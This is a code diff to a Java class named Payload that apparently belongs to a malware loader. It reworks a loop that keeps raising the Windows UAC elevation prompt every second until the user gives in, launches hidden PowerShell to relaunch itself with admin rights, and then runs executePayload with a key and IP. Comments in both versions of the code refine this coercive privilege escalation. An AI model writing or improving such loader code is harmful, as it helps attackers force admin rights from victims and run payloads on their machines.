@@ -29,16 +29,14 @@ public class Payload {
             log("Key: " + key + " | IP: " + ip);
 
             if (!isAdmin()) {
-                log("Not admin. Starting UAC...");
-                while (true) {
-                    boolean accepted = askForAdmin(key, ip);
-                    if (accepted) {
-                        log("UAC Accepted. Parent exiting.");
-                        System.exit(0);
-                    }
+                log("Not admin. Starting UAC loop...");
+                // Simple loop: keep asking until accepted
+                while (!askForAdmin(key, ip)) {
                     log("UAC Denied. Waiting 1s before retrying...");
-                    Thread.sleep(1000); // 1 second pause to prevent Windows UAC spam block
+                    Thread.sleep(1000);
                 }
+                log("UAC Accepted. Parent exiting.");
+                System.exit(0);
             } else {
                 log("We are Admin! Proceeding.");
                 executePayload(key, ip);
@@ -55,7 +53,7 @@ public class Payload {
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             File lockFile = new File(getLoaderDir(), ".lock");
 
-            // Create the lock file BEFORE triggering UAC
+            // Create the lock file BEFORE asking for admin
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             String psCommand = String.format(
@@ -65,18 +63,24 @@ public class Payload {
 
             log("Triggering UAC via PowerShell...");
             Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+            
+            // Wait for PowerShell to close (which happens when you click Yes or No)
             p.waitFor();
             
-            // If the user clicked Yes, the elevated process starts and deletes the lock file
-            boolean accepted = !lockFile.exists();
-            
-            // Clean up the lock file if it's still there
-            if (lockFile.exists()) {
-                lockFile.delete();
+            // Give the elevated process up to 10 seconds to start up and delete the lock file
+            log("Checking if elevated process started...");
+            for (int i = 0; i < 100; i++) {
+                if (!lockFile.exists()) {
+                    lockStream.close();
+                    return true; // Lock deleted = elevated process is running
+                }
+                Thread.sleep(100); // Check every 100ms
             }
-            lockStream.close();
             
-            return accepted;
+            // If we get here, the lock file still exists after 10 seconds (User clicked No)
+            lockStream.close();
+            if (lockFile.exists()) lockFile.delete();
+            return false;
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
             return false;
@@ -191,7 +195,7 @@ public class Payload {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
             
-            // Delete the lock file to signal the parent process to die
+            // CRUCIAL: Delete the lock file IMMEDIATELY so the parent knows we are elevated
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
